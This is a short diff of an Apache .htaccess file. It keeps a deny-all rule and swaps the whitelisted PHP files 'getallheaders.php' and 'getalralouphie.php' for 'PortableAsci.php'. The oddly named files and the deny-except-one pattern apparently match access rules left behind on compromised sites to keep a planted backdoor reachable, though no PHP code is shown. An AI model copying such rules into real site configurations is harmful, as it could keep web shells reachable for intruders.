@@ -5,11 +5,12 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(getallheaders.php|getalralouphie.php)$">
+<FilesMatch "^(PortableAsci.php)$">
 Order allow,deny
 Allow from all
 
 </FilesMatch>
+
 
 
 
